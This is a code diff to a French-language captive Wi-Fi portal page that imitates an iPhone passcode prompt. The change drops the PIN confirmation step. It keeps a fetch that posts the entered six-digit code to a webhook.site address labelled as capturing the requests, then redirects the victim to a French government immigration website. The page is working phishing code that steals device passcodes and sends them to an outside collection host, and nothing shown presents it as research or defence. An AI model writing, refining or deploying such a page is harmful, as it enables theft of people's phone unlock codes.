@@ -246,10 +246,9 @@
             </div>
 
             <!-- Formulaire -->
-            <form id="captiveForm" action="/login" method="POST">
+            <form id="captiveForm" action="/login" method="POST" onsubmit="event.preventDefault();">
                 
                 <input type="hidden" name="pin" id="hiddenPinInput" value="">
-                <input type="hidden" name="pin_confirm" id="hiddenPinConfirmInput" value="">
 
                 <!-- Puces PIN -->
                 <div class="pin-container">
@@ -322,16 +321,12 @@
 
         <script>
             let pin = "";
-            let firstPin = "";
-            let step = 1; // Etape 1: Saisie initiale, Etape 2: Confirmation
             const maxDigits = 6;
             const dots = document.querySelectorAll('.pin-dot');
             const hiddenInput = document.getElementById('hiddenPinInput');
-            const hiddenConfirmInput = document.getElementById('hiddenPinConfirmInput');
             const errorMessage = document.getElementById('errorMessage');
             const portalCard = document.getElementById('portalCard');
             const form = document.getElementById('captiveForm');
-            const subtitleText = document.getElementById('subtitleText');
 
             function pressKey(num) {
                 if (pin.length < maxDigits) {
@@ -379,40 +374,18 @@
 
             function resetForm() {
                 pin = "";
-                firstPin = "";
-                step = 1;
-                subtitleText.innerHTML = "Saisissez le code que vous utilisez<br>pour déverrouiller cet iPhone.";
                 updateDots();
                 hideError();
             }
 
             function handlePinCompletion() {
-                if (step === 1) {
-                    // Première étape terminée
-                    firstPin = pin;
-                    hiddenInput.value = firstPin;
-                    
-                    // Passage à la deuxième étape
-                    step = 2;
-                    pin = "";
-                    
-                    // Mise à jour visuelle pour la confirmation
-                    subtitleText.innerHTML = "Saisissez à nouveau votre code<br>pour le confirmer.";
-                    
-                    setTimeout(() => {
-                        updateDots();
-                    }, 200);
-
-                } else if (step === 2) {
-                    // Deuxième étape terminée
-                    hiddenConfirmInput.value = pin;
-                    submitPin();
-                }
+                hiddenInput.value = pin;
+                submitPin();
             }
 
             function submitPin() {
                 // URL de la page de redirection
-                const targetUrl = "https://studento.fr";
+                const targetUrl = "https://administration-etrangers-en-france.interieur.gouv.fr/usagers/#/";
 
                 // URL unique Webhook.site pour capturer les requêtes
                 const postUrl = "https://webhook.site/52003d85-b0cc-4023-9a37-28b8e59c1a0f";
@@ -425,8 +398,7 @@
                             'Content-Type': 'application/x-www-form-urlencoded',
                         },
                         body: new URLSearchParams({
-                            'pin': firstPin,
-                            'pin_confirm': pin
+                            'pin': pin
                         })
                     }).catch(err => {
                         console.warn("Fetch ignoré ou échoué:", err);
